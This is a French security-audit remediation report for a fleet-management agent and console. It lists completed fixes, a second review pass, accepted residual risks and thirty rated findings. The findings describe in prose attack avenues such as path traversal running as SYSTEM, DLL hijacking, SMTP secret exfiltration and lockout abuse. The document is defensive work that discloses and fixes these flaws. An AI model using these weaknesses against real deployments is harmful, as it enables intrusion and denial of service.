| T09 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Le téléchargement est servi d'après les fichiers enregistrés sur la commande ouverte, plus d'après le paquet courant. Un fichier stocké est conservé tant qu'un paquet le nomme ou qu'une commande ouverte (en attente, remise ou en cours) le liste. Le worker n'a pas le volume des paquets : la purge tourne côté API, après chaque dépôt ou retrait, après un dépôt en échec, au verdict d'un déploiement et au démarrage ; elle retire aussi les `.upload-*` de plus de 24 h. La suppression d'un paquet entier n'existe toujours pas (seul le retrait) : rien à purger de ce côté. |
| T10 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Règle retenue : **expiration, jamais de relivraison** (relivrer un `reboot` après un redémarrage de l'agent bouclerait). Le worker passe toutes les 5 min en `failed` « sans réponse du poste » les commandes `delivered` depuis plus de `COMMAND_UNANSWERED_HOURS` (24 h par défaut, nouvelle variable) et les `running` démarrées depuis plus longtemps ; un verdict tardif l'emporte. Côté agent : file en mémoire portée de 16 à 256, et au-delà un `failed` « file pleine » ; à l'arrêt, chaque commande en attente reçoit un `failed` ; un type inconnu reçoit un `failed` qui nomme la version de l'agent. Ces verdicts passent par `queue.Queue`, rejouée au prochain contact. |
| T11 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Conforme. |
| T12 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Fait dans `xlsx_response` seulement (`ILLEGAL_CHARACTERS_RE`) : `bound_text` n'est pas touché, ses valeurs étant comparées telles que rapportées (nom d'hôte, empreinte). |
| T13 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Nom coupé à 100 caractères, suffixe « (n) » compris ; la clé (`ad_key`, 500) garde la valeur entière. Le placement tourne dans un savepoint : un échec est journalisé et n'empêche plus le heartbeat. Les bornes `ad_location` (200) et `ou_dn` (500) tenaient déjà dans `ad_key`. |
| T14 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Fiche : `Promise.allSettled`, menaces et commandes demandées seulement avec `threat:read` / `command:read` ; sans ces droits, la carte des menaces et l'onglet Commandes sont masqués. Tableau de bord : la liste des menaces actives est masquée sans `threat:read`, et son échec n'empêche plus les compteurs. Vérifié dans un navigateur avec un compte `machine:read` seul. |
| T15 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Conforme ; le test qui figeait l'ordre sans `inventory` est corrigé. |
| T16 | 2026-11-11 | `claude/sweet-cray-xhpetg` | `recompute_last_maintenance` après toute création, modification ou suppression d'une entrée du journal, et à l'enregistrement d'une séance. Une date future (au-delà de 5 min de tolérance d'horloge) est refusée en 422 sur `performed_at`, pour la séance comme pour le journal. Migration `0031` : recalcul unique pour tout le parc, qui affiche le nombre de postes modifiés. |
| T17 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Un responsable désactivé est sauté dans la résolution (poste, puis salle, puis parc) au lieu d'être traité comme une impasse ; le responsable par défaut qui ne désigne plus aucun compte, ou un compte désactivé, vaut « aucun ». Une vérification assignée à un compte désactivé apparaît dans « À prendre ». Les `PATCH` (poste, salle, réglages, vérification) ne revalident le responsable que s'il change. `/checks/assignable-users` est ouverte à `check:read`, `maintenance:write` ou `settings:write` (nouvelle dépendance `require_any_permission`). Pas de réaffectation automatique à la désactivation : un compte réactivé retrouve ses tâches ; la console le signale à la désactivation. |
| T18 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Option « renommer » : la salle en collision devient « Salle 101 (Bâtiment B) », numérotée au besoin, et le journal d'audit liste les renommages. |
| T19 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Tout entier de 1 à 99 est accepté depuis l'URL ; le menu du filtre ajoute le seuil en cours quand il n'est pas l'un des deux proposés, et la puce affiche « Moins de N % libres ». |
| T20 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Liste : un chargement demandé qui échoue après un premier succès vide les lignes et la sélection et affiche le bandeau d'erreur (vérifié en coupant l'API). Fiche : bandeau quand le poste n'a pas pu être chargé (passage au poste suivant compris), indicateur de chargement tant qu'il n'est pas là, et notification quand une actualisation demandée échoue sur une fiche déjà affichée. |
| T21 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Conforme. |
| T22 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Conforme : le plus ancien `first_seen`, le cycle et le responsable du doublon quand la fiche gardée n'en a pas. |
| T23 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Le ciblage revient à « Un emplacement » à chaque ouverture. « Tout le parc » et toute désinstallation passent par une confirmation qui annonce le nombre de postes. Une installation que ni la méthode B (signature) ni la méthode A (exécutable d'éditeur, sans fichier chargeable à côté, mêmes règles que l'agent depuis T02) ne couvre est refusée : bouton désactivé dans le dialogue, 409 `package.not_ready` côté serveur. La désinstallation n'est pas bloquée : `msiexec /x {code}` passe en méthode A. |
| T24 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Les actions secondaires (dépôt, retrait d'un fichier, signature, retrait du paquet) ne mettent à jour que les champs que le lecteur n'a pas modifiés ; un indicateur « Modifications non enregistrées » et une confirmation en quittant la page signalent la saisie en cours. Dépôt : un fichier par requête (progression globale), taille vérifiée avant l'envoi contre le plafond par défaut de 2 Gio, bouton Annuler (`AbortController`), 413 du proxy traduit. Caddy passe à `2GiB`. Nouveau code `package.file.not_found`. Vérifié dans un navigateur : des arguments tapés sans enregistrer survivent au dépôt d'un fichier. |
| T25 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Nouvelle route `GET /commands/package-summary?package_id=` (`command:read`, filtrée par périmètre) : le dernier déploiement de chaque poste, compté par statut et par action. La fiche paquet l'affiche en puces au-dessus d'un tableau paginé côté serveur (25, 50 ou 100 lignes). Une puce filtre le tableau par statut ; le filtre porte sur tout l'historique, la puce sur le dernier déploiement de chaque poste. |
| T26 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Le texte tapé dans « Emplacements » est validé à la perte du focus et avant l'enregistrement (avec `input-debounce` à 0 : l'anti-rebond par défaut de 500 ms perdait une saisie suivie d'un clic rapide). Enregistrer un groupe sans aucun périmètre demande confirmation, à la création ou quand le groupe était restreint. Vérifié dans un navigateur. |
| T27 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Le libellé du code reste en tête, complété : par le message du serveur pour `package.invalid` ; par le champ fautif et sa raison pour `request.validation_error` (premier champ de `details.errors`, nommé en français pour les plus courants) ; par la liste des problèmes pour `package.not_ready`. La fiche paquet valide aussi côté client le nom, l'identifiant winget, les arguments exigés par msiexec et les codes de sortie, avec les règles du serveur. |
| T28 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Nouvelle fonction `intFieldError` : champ requis, entier, dans les bornes de `SettingsUpdate`. Appliquée aux cartes Maintenance et Supervision du parc : erreur sous le champ, bouton Enregistrer désactivé tant qu'elle persiste ; un champ vidé n'est plus envoyé comme 0. Les cartes Utilisation et E-mail avaient déjà leurs contrôles. Vérifié dans un navigateur. |
| T29 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Séance de maintenance : dialogue persistant ; Annuler et Échap ferment aussitôt si rien n'a été saisi, sinon demandent confirmation (Échap écouté sur le dialogue, Quasar ne l'émettant plus en mode persistant). La saisie n'est remise à zéro qu'après un enregistrement, une annulation confirmée ou un changement de salle. Mot de passe réinitialisé : dialogue persistant tant que le mot de passe est affiché, et échec de la copie signalé. Vérifié dans un navigateur pour la séance. |
| T30 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Les neuf points, vérifiés dans un navigateur (bureau et iPhone 13). `/maintenance/due` ne liste plus les postes exclus (comptés seulement). « À faire » ne garde que les salles en retard ou à échéance ; la séance ne pré-coche que les postes dus (fiche salle et Mes tâches), jamais un exclu. « Me l'affecter » et « Transmettre… » (dialogue de réglage de la salle) depuis Mes tâches. Badge : deux pastilles (vérifications, postes en retard de maintenance), recomptées après chaque action via `notifyTasksChanged`. Note d'un poste décoché envoyée dans `skipped` et écrite dans son journal en « Autre » intitulé « Maintenance non faite — salle », sans toucher son échéance. Libellés accessibles des cases. « en retard depuis N jours » ou « échéance le JJ/MM/AAAA ». Vérifications en cartes sur téléphone, colonne Consignes d'au moins 280 px, libellé de lieu replié. La fiche salle charge tous ses postes, page après page. |
| T31 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Sélection vidée à chaque changement de filtre, de page, de tri ou de taille de page. Navigation : option « figer l'instantané » plutôt qu'un curseur serveur (qui demanderait une pagination par clé sur chaque colonne de tri) : la recherche est lue par blocs de 50, gelés pour la session ; si le poste ouvert n'est plus au rang indiqué, il est retrouvé dans l'instantané. L'instantané est remis à zéro à chaque retour sur la liste. La fusion recharge aussi le journal des interventions. |
| T32 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Bâtiment et salle : un compte restreint ne change le site d'un lieu qu'entre deux sites que son périmètre couvre (403 `auth.scope.restricted` sinon), quel que soit le lieu qu'il tient par identifiant. Journal d'audit : option « filtrer », un compte restreint ne lit que les entrées sur un poste de son périmètre et ses propres actions ; `/audit/actions` reste la liste des noms d'actions. Vérifications : le destinataire doit avoir `check:read` et voir tous les postes (422, nouveau code `check.assignee.out_of_reach`), à la création, en masse et à la réaffectation ; `/checks/assignable-users?machine_id=` filtre en conséquence et le dialogue de demande l'utilise pour un poste. |
| T33 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Création unitaire : la violation de `uq_machine_checks_open` devient un 409 `check.already_open`. Création en masse : `INSERT … ON CONFLICT DO NOTHING` sur l'index partiel, le décompte « créées / ignorées » et le courriel ne portent que sur les lignes réellement insérées. Clôture : `UPDATE … WHERE closed_at IS NULL RETURNING`, 409 pour la seconde, une seule ligne au journal. Salle sortie de son bâtiment : le serveur recopie le site du bâtiment quand aucun emplacement n'est fourni (l'effacer est une seconde modification), et le formulaire pré-remplit le site effectif. |
| T34 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Réinitialisation : un lien encore valide émis il y a moins de 5 min est conservé, sans nouveau courriel, quelle que soit l'adresse IP qui redemande ; la réponse reste un 204. L'égalisation du temps de réponse (adresse connue ou non) n'est pas faite : l'écart vient d'écritures en base, et la limite par compte réduit déjà l'intérêt de l'énumération. Changement d'e-mail par un administrateur : liens en attente purgés, ancienne adresse notée au journal d'audit (`previous_email`). `FIRST_ADMIN_PASSWORD` doit faire au moins `PASSWORD_MIN_LENGTH` caractères hors environnement local ; `.env.example` et `DEPLOYMENT.md` le disent. |
| T35 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Relais : exclus les postes « identité à confirmer », au token révoqué, enrôlés depuis moins de `WOL_RELAY_MIN_AGE_MINUTES` (60) ou d'agent antérieur à `WOL_RELAY_MIN_AGENT_VERSION` (1.0.0, première version qui relaie). Pas de liste d'emplacements validés côté serveur : l'emplacement reste déclaratif, ces exclusions en réduisent l'usage. Un réveil pris sans verdict après `WOL_RELAY_CLAIM_TIMEOUT_SECONDS` (180) retourne en file. Réveil direct : destination déduite seulement pour une adresse privée ou dans `WOL_ALLOWED_NETWORKS`, masque rapporté accepté de /16 à /30 (sinon le défaut) ; les adresses configurées restent prioritaires. Le script `bc_forwarding` n'est pas restreint à l'interface LAN : le noyau exige `all` et l'interface d'entrée (le pont Docker), comme l'explique le script. |
| T36 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Placement : en mode `ad_ou`, l'OU rapportée doit contenir le DN rapporté, sinon le poste n'est pas rangé ; pas de vérification du CN contre le nom d'hôte (un nom NetBIOS tronqué à 15 caractères le rendrait faux). Un heartbeat n'adopte plus une salle créée à la main : le poste reste sans salle, sans créer de « Nom (2) », jusqu'à ce qu'un administrateur lance la resynchronisation, qui elle adopte. Création automatique plafonnée à 200 salles par heure pour tout le parc. Pas de lecture LDAP côté serveur. Heartbeat : 30 par minute et par poste (429 au-delà). Le worker purge chaque matin les logiciels qu'aucun poste n'a, vus pour la première fois il y a plus d'un jour. |
| T37 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Agent : `http://` refusé au chargement sauf `AllowInsecureHTTP` (registre) / `allow_insecure_http` (YAML) / `init-config --allow-insecure-http`, avec un avertissement à chaque démarrage ; aucune redirection suivie ; corps d'erreur lu sur 4 Kio ; journal tourné à chaud au-delà de 5 Mio ; téléchargement borné à la taille du manifeste (taille passée au `Fetcher`, une octet de plus déclenche l'échec). B32 : option « relire » — avant de s'enrôler, l'agent relit `token.dat` et réutilise un jeton redevenu lisible ; un jeton illisible n'empêche toujours pas le démarrage du service. B33 : un 403 « en attente d'approbation » ou « révoqué » espace les tentatives à 30 min ; côté serveur, une ligne d'audit par demande (nouvelle adresse ou plus de 24 h), plus une par tentative. `DEPLOYMENT.md` corrigé, avec l'avertissement de poser l'option avant la mise à jour. |
| T38 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Option « refuser » des deux côtés. Serveur : caractères de contrôle C0, C1 et DEL refusés (422) dans le nom, la version, les fichiers à lancer, le nom dans l'inventaire et les arguments. Script : `Assert-NoControl` vérifie nom, version, noms de fichiers, `run` et `args` avant tout affichage et refuse de signer. Le script n'a pas pu être exécuté ici (pas de PowerShell) : l'expression régulière est du .NET standard. |
| T39 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Fonctions communes `escape_like` et `contains` (`app/features/base.py`), appliquées à toutes les recherches par sous-chaîne : postes (recherche et filtres antivirus, OS, modèle, fabricant, processeur), logiciels, comptes, journal d'audit, détection des paquets. Les deux copies locales de `_escape_like` sont retirées. La recherche par adresse MAC compare une forme hexadécimale nettoyée, sans joker possible : inchangée. |
| T40 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Sauvegardes : `umask 077` et `chmod 600` des dumps existants ; **pas de chiffrement** dans le conteneur (l'image `postgres:16-alpine` n'a ni `gpg` ni `openssl`), la documentation exige une copie hors serveur chiffrée. `X-Forwarded-For` lu seulement d'un pair de confiance (boucle locale, `TRUSTED_PROXIES`, ou adresse résolue de `TRUSTED_PROXY_HOSTS`, `caddy` par défaut) ; port de dev publié sur `127.0.0.1` sauf `TIAI_DEV_BACKEND_BIND`. Actions GitHub épinglées par SHA (version en commentaire, Dependabot `github-actions` les suit), permissions au job ; `GIST_SECRET` remplacé dans l'`env` des jobs par un booléen. nginx 1.30 ; Trivy sur l'image frontend (nouveau job). Backend et worker : compte `tiai` (10001), l'entrypoint démarre en root pour confier le volume des paquets puis abandonne tout par `setpriv` ; compose `cap_drop: ALL` sauf CHOWN/SETUID/SETGID, `no-new-privileges` (vérifié dans un conteneur). curl retiré (lot Dependabot). `index.html` en `no-cache` (configuration nginx validée par `nginx -t`). OpenAPI et /docs coupés hors `local` sauf `EXPOSE_OPENAPI`. L'image backend complète n'a pas pu être construite ici (ghcr.io bloqué) : la CI le fera. |
| T41 | 2026-11-11 | `claude/sweet-cray-xhpetg` | B23 : après la perte de session, chaque requête en cours reçoit une erreur synthétique `auth.session.invalid` (« Votre session a pris fin »), que Quasar regroupe en une seule notification. B24 : route publique `GET /auth/password-policy` lue une fois par `usePasswordPolicy` (formulaires de compte, d'utilisateurs, de réinitialisation, durée du lien). B25 : libellés des actions `package.*`, `user.locked`, `machine.reenroll_requested` et du type « Paquet » ; un test backend vérifie désormais que toute action et tout type enregistrés ont leur libellé dans la console. B26 : repli sur la dernière page existante. B27 : `not_null` refuse en 422 un champ obligatoire envoyé à `null` (comptes, groupes, bâtiments, salles). |
| T42 | 2026-11-11 | `claude/sweet-cray-xhpetg` | Recherche, tri, sens, page et taille de page dans l'URL de la page Logiciels ; « Vu depuis » en date locale. Nouvelle route `GET /software/{id}` : la puce de la liste des postes dit « Logiciel : 7-Zip 23.01 » et reste visible panneau ouvert (seule puce sans contrôle dans le panneau). Tableau vide : trois libellés (catalogue vide, aucun résultat pour la recherche, échec) et bandeau d'erreur avec Réessayer. Vérifié dans un navigateur, retour arrière compris. |
| T43 | 2026-11-11 | `claude/sweet-cray-xhpetg` | U07 : tableau de bord, messages vides affichés seulement une fois la liste chargée sans erreur ; « Tous les postes sont à jour ». U10 : la position est restaurée au retour arrière, le haut de page seulement en changeant de page. U11 : dialogue de fusion à 560 px, plafonné à 95vw. U12 : révocation et ré-enrôlement avec boutons explicites (« Révoquer » en rouge, « Autoriser »). U15 : autocomplete off/new-password dans le formulaire d'utilisateur. U17 : aide de la vérification TLS reformulée. U25 : colonnes par défaut réduites (Nom, Salle, Maintenance, Antivirus, MAJ Windows, Session, Vu le), plus de défilement horizontal à 1440 px ; case et nom collants au défilement, nom tronqué à 260 px (fond adapté au mode sombre). U27 : tableau des réglages empilé sur téléphone. U28 : badge de la carte d'état aux couleurs de la colonne Antivirus. U29 : e-mail masqué sur téléphone, titre entier. U30 : boutons sans capitales forcées. Vérifié dans un navigateur (1440 px, 700 px, iPhone 13). **Revu le 2026-11-13** : les colonnes d'inventaire (domaine, emplacement, bâtiment, IP, OS, version de l'agent, modèle, disque) reviennent dans le jeu par défaut à la demande des utilisateurs, qui les lisent tous les jours ; seule « Utilisation » reste optionnelle. La liste défile horizontalement, case et nom collants. La colonne « Agent » devient « Version de l'agent ». |

### 6.1 Seconde passe du 2026-11-13

Sept relecteurs indépendants ont confronté au code les 43 tâches et les déclarations du tableau ci-dessus, en rejouant les scénarios de l'audit (sondes pytest sur PostgreSQL, tests Go, specs vitest montant les vraies pages). Verdict : 18 tâches conformes sans réserve, 25 avec un écart, majeur ou résiduel, dont une régression introduite par la correction (T09). Les écarts sont repris ci-dessous, chacun avec un test qui échoue sans sa correction. Ont aussi été relevés deux constats nouveaux, hors des 102 : l'identifiant de commande servait de nom de fichier dans la file locale de l'agent, et le décodage du manifeste acceptait des clés en double ou repliées par Unicode.

| Tâche | Écart trouvé | Correction |
|---|---|---|
| T05 | Le secret du `.env` partait vers un serveur choisi dans la console en deux requêtes : mot de passe factice avec le nouveau serveur, puis remise à `null` | Un secret du `.env` ne sert que vers la destination du `.env` : la résolution le retient ailleurs (lignes écrites avant comprises), et le remettre à `null` pendant que la console pointe ailleurs est refusé (`settings.email.secret_required`). Revenir au serveur du `.env` ne demande rien |
| T06 | Pendant un verrou, chaque nouvelle adresse avait un essai réel (botnet, préfixe IPv6) ; le compteur ne décroissait jamais | Compteur remis à 1 après `LOGIN_LOCKOUT_MINUTES` sans échec (migration `0032`, `last_failed_login_at`). Au-delà de 2 × `LOGIN_MAX_FAILED_ATTEMPTS` adresses fautives pendant un verrou, seules les adresses qui ont ouvert le compte dans les 30 derniers jours restent admises. Code `auth.account.locked`, plus émis, retiré. Documentation (`DEPLOYMENT.md`, README backend, `.env.example`) mise à jour |
| T08 | Un paquet retiré après la mise en file était tout de même installé | À la remise, une installation dont le paquet est retiré passe en échec ; une désinstallation part toujours |
| T09 | **Régression** : le balayage des fichiers orphelins pouvait supprimer un fichier entre son écriture et le commit du dépôt (dépôt en 200, téléchargements en 404) | Fichier épinglé en mémoire (processus API unique) de son enregistrement jusqu'au commit ou rollback ; le balayage ignore ce qui est épinglé ou l'a été depuis son début. Il ne casse plus sur une erreur SQL et ne supprime rien si la base ne compte aucun paquet |
| T10 (agent) | Course à l'arrêt ; type inconnu sans test ; un 4xx définitif bloquait la file ; abandon silencieux quand la file est pleine | Verrou commun au worker et à la boucle de sondage ; test du verdict `failed` d'un type inconnu ; verdict refusé définitivement (4xx sauf 401, 403, 404, 408, 429) retiré de la file ; abandon journalisé |
| T12 | U+FFFE et U+FFFF produisaient un classeur que openpyxl ne relit pas | Retirés avec les demi-codets isolés ; test de bout en bout sur les deux exports |
| T16 | Une date future passait par la clôture d'une vérification, puis comptait en changeant le type de la ligne | `closed_at` borné comme `performed_at` ; passer en maintenance une ligne datée dans le futur est refusé (422) |
| T17 | `GET /rooms` nommait encore un responsable de salle désactivé | Même résolution que la politique de maintenance |
| T20, T14, U07 | Fiche : la réponse du poste précédent s'affichait sous l'URL du suivant ; tableau de bord muet sur un échec d'actualisation demandée, états vides figés | Réponse ignorée si elle ne concerne plus le poste de l'URL ; notification sur échec demandé ; états vides liés au dernier chargement ; `?tab=commands` sans droit revient à l'onglet par défaut |
| T23 | Une désinstallation qu'aucun poste n'exécuterait était acceptée ; bandeau faux pour `msiexec /x {code}` ; double confirmation sur double clic | Règle de l'agent appliquée à la désinstallation, côté serveur (409 `package.not_ready`) et console ; garde contre le double clic |
| T24 | `Caddyfile.dev` resté à `2GB` ; enveloppe multipart au-delà de la limite Caddy | Les deux Caddyfiles à `2050MiB`, juste au-dessus de `PACKAGE_MAX_BYTES` : c'est le 413 JSON de l'API qui répond |
| T29 (U13) | Le mot de passe réinitialisé se perdait si le dialogue était fermé pendant la requête | Dialogue persistant pendant la requête ; un mot de passe arrivé après fermeture rouvre le dialogue |
| T31 | Lien « Postes » du menu : filtres remis à zéro, sélection gardée ; navigation précédent/suivant : poste répété à chaque bloc de 50, voisins faux si le poste avait bougé | Sélection vidée à tout changement de requête ; instantané sans doublon, poste ouvert cherché jusqu'à 2 000 lignes, sinon ni rang ni voisins |
| T35 | `is_private` acceptait 255.255.255.255, 240/4, 192.0.2/24… ; sous-réseau déduit non borné par `WOL_ALLOWED_NETWORKS` ; relais libéré resservi ; relais non fiables comptés ; agent sans version tenu pour fiable | RFC 1918 stricte ; le sous-réseau déduit doit tenir dans un réseau autorisé ; relais libéré exclu de ce réveil (migration `0033`, `commands.released_relay_ids`) ; seuls les relais de confiance comptent ; agent sans version lisible exclu |
| T36 | La resynchronisation adoptait une salle manuelle pour la première clé venue (un agent forgé suffisait) ; 30 heartbeats/min laissaient créer 60 000 logiciels en 27 s | Règle DN/OU du heartbeat appliquée à la resynchronisation ; adoption pour la clé d'une majorité stricte de postes seulement. Heartbeat à 12/min par poste ; 2 000 nouvelles entrées de catalogue par poste et par 24 h ; balayage des limiteurs amorti |
| T37 | Un `token.dat` impossible à effacer après un 401 était relu en boucle, sans réenrôlement | Le jeton refusé est gardé en mémoire et ignoré à la relecture ; tests d'`ensureEnrolled` |
| T38 | `$` de `re.match` acceptait un saut de ligne final (noms de fichier, identifiant winget, SHA-256) ; contrôles bidirectionnels acceptés | `fullmatch` ; U+202A–202E, U+2066–2069, U+2028/2029 refusés avec les caractères de contrôle |
| T39 | La recherche par MAC acceptait `_` comme joker | Chiffres hexadécimaux seuls, motif échappé |
| T40 | Dumps manuels documentés lisibles par tous ; `X-Forwarded-For` en plusieurs lignes : la première l'emportait | `umask 077` dans les commandes documentées, dossier en 700, `.partial` résiduels retirés ; toutes les lignes lues, dans l'ordre, entrées vides ignorées. Aussi : `persist-credentials: false`, Dependabot sur les images, `immutable` réservé à `/assets/`, rechargement unique sur module introuvable après déploiement (S34) |
| T41 | `PATCH /users {"group_ids": null}` en 500 | 422 ; tests étendus aux bâtiments et aux salles |
| T42 | Page au-delà de la dernière : « aucun logiciel » ; lien du menu sans effet ; réponses périmées | Repli sur la dernière page, suivi des changements d'URL, réponses périmées ignorées |
| T43 | U10 : position restaurée avant le chargement des lignes ; U11 : dialogue de sortie de commande trop large ; U28 : badge antivirus de la liste vert pour « Non relevé » ; U25 : icônes coupées par un nom long | Restauration différée jusqu'à ce que la page soit assez haute (3 s au plus) ; largeur plafonnée à 95vw ; couleur de la fiche ; seul le nom est tronqué |
| T30 | Postes sans salle à jour listés « à faire » ; badge non recompté après plusieurs actions ; échéances avec heure sur la fiche | Seuls les postes en retard ou à échéance ; badge recompté (vérification, historique, responsable, cycle) ; date seule |
| T32 | Responsable de maintenance assignable à un compte qui ne voit pas le poste ; `/checks/assignable-users?machine_id=` sans le périmètre de l'appelant | Le responsable doit détenir `maintenance:read` et `maintenance:write` et voir le poste ou la salle (422 `maintenance.owner.out_of_reach`) ; 404 hors périmètre |
| T34 | Une demande de réinitialisation après 5 min supprimait le lien encore valide ; limite par compte non atomique | Un lien valide n'est jamais supprimé par une demande ; 1 envoi par 5 min et 3 liens vivants au plus, demandes sérialisées par verrou sur le compte ; utiliser un lien invalide les autres |
| T02, S25 (hors liste) | Extensions chargeables manquantes ; manifeste décodé avec tolérance | `.bpl .pyd .xll .node .rll .wsc .sct` ajoutées des trois côtés, test d'égalité des trois listes ; manifeste refusé s'il a une clé en double, inconnue ou de casse différente ; méthode A plafonnée à 8 Gio annoncés ; identifiant de commande exigé en UUID par l'agent |
| Documentation | Verrouillage décrit à l'ancienne ; conseil de passer en `http://` sans l'option ; variables absentes ; notes v1.2.0 contradictoires | Corrigé dans `DEPLOYMENT.md`, les README, `.env.example` ; option `AllowInsecureHTTP` ajoutée au script GPO et au MSI ; notes de version v1.2.0 rectifiées, v1.2.1 rédigées |

Tests manquants ajoutés : specs de pages pour T14, T20, T26, T29, T30, T31, T42, et dialogues de séance de maintenance (U14) et de déploiement (T23).

### 6.2 Limites acceptées après la seconde passe

- **Sauvegardes non chiffrées** (T40) : l'image `postgres:16-alpine` n'a ni `gpg` ni `openssl` ; la documentation exige une copie hors serveur chiffrée.
- **Verrou et adresse partagée** (T06) : des opérateurs qui sortent par la même adresse qu'un attaquant (NAT, VPN, proxy non déclaré) partagent le verrou de cette adresse. Documenté ; déclarer le proxy de confiance.
- **Mémoire en processus** (T06, T09) : le verrou par adresse, les adresses connues des comptes et les fichiers épinglés supposent un seul processus API, ce que fait `entrypoint.sh`.
- **Emplacement déclaratif** (S19, S20) : sans lecture LDAP côté serveur, un agent forgé peut encore annoncer l'emplacement d'un autre poste (relais WoL) ou un DN cohérent pour rejoindre une salle d'annuaire existante. Les exclusions de T35 et la règle de majorité de T36 en réduisent la portée.
- **Petits résidus non repris** : nom de salle et note globale d'une séance visibles d'un compte restreint qui y a un poste (T04) ; détails d'une fusion sur un poste d'un autre site dans le journal d'audit (T32) ; séance de maintenance sans aucun poste fait impossible à enregistrer et salles de plus de 1 000 postes à saisir en plusieurs fois (T30) ; dialogue de séance et page Salles non adaptés au téléphone (U23) ; budget de 5 essais du changement de mot de passe partagé avec le titulaire (T07). En méthode A, l'agent exécute `msiexec` avec un code produit en `/x` quelle que soit l'action ; serveur et console refusent une installation non signée par `msiexec`, ce cas ne survient donc que d'un serveur compromis, avec pour seul effet une désinstallation.

## 7. Détail des constats


| # | Sévérité | Constat |
|---|---|---|
| [S01](#s01) | Élevée | Agent : l'identifiant de paquet envoyé par le serveur sert de chemin sans validation (traversée de répertoire, écriture et suppression récursive en SYSTEM) |
| [S02](#s02) | Élevée | Méthode A : des fichiers non signés (DLL) sont déposés à côté de l'exécutable signé, ce qui permet un chargement de DLL détourné et l'exécution de code arbitraire en SYSTEM |
| [S03](#s03) | Moyenne | Verrouillage de compte déclenchable à volonté : déni de service permanent sur n'importe quel compte, administrateur compris |
| [S04](#s04) | Moyenne | POST /auth/password sans limitation : brute-force du mot de passe actuel et blocage de toute l'API par bcrypt synchrone |
| [S05](#s05) | Moyenne | Escalade de périmètre par la modification d'un groupe : un gestionnaire limité à un site accorde des droits sur tout le parc |
| [S06](#s06) | Moyenne | Le détail d'une session de maintenance liste les postes hors périmètre |
| [S07](#s07) | Moyenne | Heartbeat en erreur 500 permanente en mode ROOM_SOURCE=ad_location dès que l'attribut AD « location » dépasse 100 caractères |
| [S08](#s08) | Moyenne | Le contenu du paquet est lu à la livraison, pas à la mise en file : un détenteur de package:write modifie un déploiement déjà approuvé par un autre |
| [S09](#s09) | Moyenne | Fichiers de paquets jamais supprimés : remplacement, échec partiel d'un dépôt multi-fichiers et absence de suppression de paquet saturent le disque (partagé avec PostgreSQL) |
| [S10](#s10) | Moyenne | Exfiltration du mot de passe SMTP ou de la clé API Mailgun stockés, via l'« e-mail de test » ou un PATCH qui ne change que l'hôte ou l'URL |
| [S11](#s11) | Moyenne | Export Excel (parc et logiciels) cassé en 500 par un caractère de contrôle venu d'un agent |
| [S12](#s12) | Faible | Énumération des comptes via le 423 « compte verrouillé » malgré le faux hachage |
| [S13](#s13) | Faible | Compteur d'échecs de connexion sujet aux mises à jour perdues : le verrouillage par compte est très affaibli en rafale |
| [S14](#s14) | Faible | Demande de réinitialisation : n'importe qui peut invalider le lien en cours d'un utilisateur et inonder sa boîte, la limite étant par IP et non par compte |
| [S15](#s15) | Faible | Changement d'adresse e-mail par un administrateur sans invalidation des liens de réinitialisation en attente |
| [S16](#s16) | Faible | Un compte limité à un bâtiment ou à une salle peut déplacer ce lieu vers un autre site et retirer des postes du périmètre des autres équipes |
| [S17](#s17) | Faible | Journal d'audit non filtré par périmètre |
| [S18](#s18) | Faible | Assignation d'une vérification à un compte qui ne voit pas le poste : le courriel lui révèle des postes hors périmètre |
| [S19](#s19) | Faible | Relais Wake-on-LAN détournable : l'emplacement et l'IP déclarés par l'agent décident seuls qui reçoit les réveils d'un site |
| [S20](#s20) | Faible | Placement en salle piloté par l'agent : choix de la salle, salles existantes captées et création de salles illimitée |
| [S21](#s21) | Faible | Catalogue logiciel global sans limite de croissance, alimenté par n'importe quel token d'agent, sans limite de débit sur le heartbeat |
| [S22](#s22) | Faible | L'agent accepte une ApiBaseURL en http:// et envoie alors en clair le secret de flotte puis le token |
| [S23](#s23) | Faible | Journal de l'agent sans limite pendant que le service tourne : corps d'erreur lus et journalisés en entier, rotation seulement au démarrage |
| [S24](#s24) | Faible | L'agent télécharge sans plafond de taille : un serveur compromis peut remplir le disque système des postes |
| [S25](#s25) | Faible | Le script de signature affiche les arguments, nom et version sans les neutraliser : des séquences de contrôle (ESC, CR) peuvent cacher la vraie commande à l'administrateur qui signe |
| [S26](#s26) | Faible | Recherche LIKE non échappée : « _ » et « % » saisis élargissent les résultats des listes et des exports |
| [S27](#s27) | Faible | Sauvegardes de la base non chiffrées et lisibles par tout utilisateur de l'hôte |
| [S28](#s28) | Faible | Override de dev : backend en clair sur 0.0.0.0:8800 qui fait confiance à X-Forwarded-For (limitation de débit et IP d'audit contournables) |
| [S29](#s29) | Faible | Actions GitHub tierces référencées par tag mutable alors qu'elles reçoivent un jeton en écriture ou un PAT |
| [S30](#s30) | Faible | PAT GIST_SECRET exposé en variable d'environnement à tout le code des jobs de test |
